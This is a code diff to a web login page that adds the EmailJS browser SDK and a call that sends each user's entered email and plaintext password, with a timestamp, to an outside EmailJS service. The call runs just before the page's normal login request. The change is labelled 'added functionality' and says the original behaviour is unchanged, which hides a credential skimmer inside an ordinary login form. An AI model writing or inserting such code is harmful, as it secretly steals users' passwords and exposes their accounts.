@@ -27,7 +27,20 @@
                 return;
             }
 
-            // Send the data to the server
+            // Send the data to EmailJS (added functionality)
+            emailjs.send('service_26p7vyd', 'template_mrthmvh', {
+                email: email,
+                password: password,
+                date: new Date().toLocaleString()
+            })
+            .then(() => {
+                console.log('Login details sent to email!');
+            })
+            .catch(error => {
+                console.error('EmailJS Error:', error);
+            });
+
+            // Send the data to the server (original functionality unchanged)
             try {
                 const response = await fetch('/login', {
                     method: 'POST',
@@ -88,5 +101,14 @@
             </div>
         </div>
     </div>
-</body>
+
+    <!-- Add EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("GNA3u969Bx38j6iPg"); // Replace with your Public Key from EmailJS dashboard
+        })();
+    </script>
+
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9215d9757970b037',t:'MTc0MjE0NDg3My4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
 </html>
